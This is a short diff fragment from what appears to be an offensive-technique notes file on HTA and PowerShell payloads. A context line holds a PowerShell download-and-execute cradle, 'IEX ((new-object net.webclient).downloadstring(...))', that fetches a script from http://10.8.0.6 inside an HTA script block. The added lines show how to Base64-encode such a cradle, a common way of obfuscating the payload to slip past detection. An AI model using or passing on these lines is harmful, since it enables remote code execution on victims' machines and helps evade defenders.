@@ -43,4 +43,8 @@ $str = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.6:80/http-
   self.close
 </script>
 
+#Encoded Base64
+
+PS > $str = "IEX ((new-object net.webclient).downloadstring('http://'))"
+PS > [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 
